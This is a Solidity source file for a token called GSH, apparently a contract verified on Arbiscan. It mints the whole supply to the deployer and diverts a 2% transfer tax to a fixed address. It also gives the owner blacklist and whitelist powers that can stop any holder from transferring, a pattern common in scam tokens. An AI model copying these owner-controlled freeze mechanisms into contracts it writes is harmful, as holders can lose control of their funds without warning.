/**
 *Submitted for verification at Arbiscan on 2023-06-26
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GSHToken {
    string public name = "GSH";
    string public symbol = "GSH";
    uint256 public totalSupply = 10000000000 * 10 ** 18; // 100亿代币
    uint8 public decimals = 18;
    address public owner;
    address public taxAddress;

    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public blacklist;
    mapping(address => bool) public whitelist;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event AddedToBlacklist(address indexed account);
    event RemovedFromBlacklist(address indexed account);
    event AddedToWhitelist(address indexed account);
    event RemovedFromWhitelist(address indexed account);

    constructor() {
        owner = msg.sender;
        taxAddress = 0x81738D803C69739871C8124b51B72FE1E541BFd0;
        balanceOf[owner] = totalSupply;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function");
        _;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Invalid address");
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }

    function renounceOwnership() external onlyOwner {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }

    function addToBlacklist(address account) external onlyOwner {
        require(account != address(0), "Invalid address");
        blacklist[account] = true;
        emit AddedToBlacklist(account);
    }

    function removeFromBlacklist(address account) external onlyOwner {
        require(account != address(0), "Invalid address");
        blacklist[account] = false;
        emit RemovedFromBlacklist(account);
    }

    function addToWhitelist(address account) external onlyOwner {
        require(account != address(0), "Invalid address");
        whitelist[account] = true;
        emit AddedToWhitelist(account);
    }

    function removeFromWhitelist(address account) external onlyOwner {
        require(account != address(0), "Invalid address");
        whitelist[account] = false;
        emit RemovedFromWhitelist(account);
    }

    function transfer(address to, uint256 value) external returns (bool) {
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        require(to != address(0), "Invalid address");
        require(!blacklist[msg.sender], "Sender is blacklisted");
        require(!blacklist[to], "Recipient is blacklisted");
        require(whitelist[msg.sender] || whitelist[to], "Sender or recipient is not whitelisted");

        uint256 taxAmount = value * 2 / 100;
        require(balanceOf[taxAddress] + taxAmount >= balanceOf[taxAddress], "Tax amount overflow");

        uint256 transferAmount = value - taxAmount;
        require(balanceOf[to] + transferAmount >= balanceOf[to], "Transfer amount overflow");

        balanceOf[msg.sender] -= value;
        balanceOf[to] += transferAmount;
        balanceOf[taxAddress] += taxAmount;

        emit Transfer(msg.sender, to, transferAmount);
        emit Transfer(msg.sender, taxAddress, taxAmount);

        return true;
    }
}